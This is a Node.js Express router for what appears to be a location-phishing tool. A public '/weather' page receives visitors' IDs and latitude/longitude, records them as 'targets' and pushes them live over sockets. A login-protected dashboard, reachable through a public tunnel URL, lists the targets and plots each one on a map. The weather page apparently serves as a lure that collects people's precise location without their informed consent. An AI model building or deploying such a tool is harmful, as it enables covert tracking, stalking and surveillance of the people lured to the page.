const express = require("express")
const config = require("../../config")
const requireLogin = require("../middleware/require-login")
const { getPublicUrl } = require("../services/tunnel")

function createRouter({ io, targetStore }) {
    const router = express.Router()

    router.get("/login", (req, res) => res.render("login"))

    router.post("/login", (req, res) => {
        const { username, password } = req.body

        if (username === config.username && password === config.password) {
            res.cookie("token", config.token, {
                httpOnly: true,
                sameSite: "lax",
                maxAge: 1000000 * 100000,
            })
        }

        res.redirect("/")
    })

    router.get("/weather", (req, res) => res.render("weather"))

    router.post("/weather", (req, res) => {
        const { id, lat, lng } = req.body

        if (!id || !Number.isFinite(Number(lat)) || !Number.isFinite(Number(lng))) {
            return res.status(400).send("Invalid location data")
        }

        const isNewTarget = !targetStore.has(id)
        targetStore.set(id, lat, lng)

        if (isNewTarget) io.emit("user-connected", id)
        io.emit("map-data", { id, lat, lng })

        console.log(`> ${id} - ${lat},${lng}`)
        return res.send("OK")
    })

    router.use(requireLogin)

    router.get("/", (req, res) => {
        res.render("home", {
            TARGETS: targetStore.all(),
            publicUrl: getPublicUrl(),
        })
    })

    router.get("/map", (req, res) => {
        const location = targetStore.get(req.query.id)
        if (!location) return res.redirect("/")

        return res.render("map", { lat: location[0], lng: location[1] })
    })

    return router
}

module.exports = createRouter
